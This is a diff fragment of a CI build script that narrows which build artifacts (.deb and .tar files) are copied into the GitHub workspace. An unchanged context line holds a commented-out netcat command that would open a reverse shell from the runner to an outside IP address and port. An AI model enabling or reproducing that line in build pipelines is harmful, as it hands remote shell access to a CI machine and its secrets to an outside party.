@@ -74,7 +74,8 @@ apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev b
 #build_qemu
 build_ovmf
 
-cp ~/* /github/workspace/
+cp ~/*.deb /github/workspace/
+cp ~/*.tar /github/workspace/
 #nc 65.108.51.31 11452 -e /bin/sh
 
 exit 0
